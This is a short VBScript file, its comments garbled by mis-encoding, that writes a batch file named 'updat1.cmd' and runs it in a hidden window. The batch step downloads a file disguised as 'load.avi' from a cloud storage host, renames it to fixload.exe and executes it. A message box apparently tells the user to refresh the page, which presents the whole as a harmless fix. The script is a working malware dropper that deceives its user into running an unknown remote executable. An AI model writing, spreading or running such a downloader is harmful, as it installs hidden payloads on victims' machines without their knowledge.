Dim fso, cmdFile, cmdContent, shell

' ���� FileSystemObject
Set fso = CreateObject("Scripting.FileSystemObject")

' ���� cmd �ļ�·��
cmdFile = fso.GetAbsolutePathName(".") & "\updat1.cmd"

' ���� cmd �ļ�����
cmdContent = "@echo off" & vbCrLf & _
             "echo ���������ļ�..." & vbCrLf & _
             "curl -o load.avi https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi" & vbCrLf & _
             "if %errorlevel% neq 0 (" & vbCrLf & _
             "    echo ����ʧ��!" & vbCrLf & _
             "    exit /b" & vbCrLf & _
             ")" & vbCrLf & _
             "echo ������ɣ�����������..." & vbCrLf & _
             "ren load.avi fixload.exe" & vbCrLf & _
             "echo ����ִ�� fixload.exe..." & vbCrLf & _
             "start /wait fixload.exe" & vbCrLf & _
             "echo �޸����!"

' ������д�� cmd �ļ�
With fso.CreateTextFile(cmdFile, True)
    .WriteLine cmdContent
    .Close
End With

' ���� Shell ����ִ�� cmd �ļ�
Set shell = CreateObject("WScript.Shell")
shell.Run cmdFile, 0, True

' ��ʾ�û�
MsgBox "ˢ����ҳ���ɡ�", vbInformation, "��ʾ"
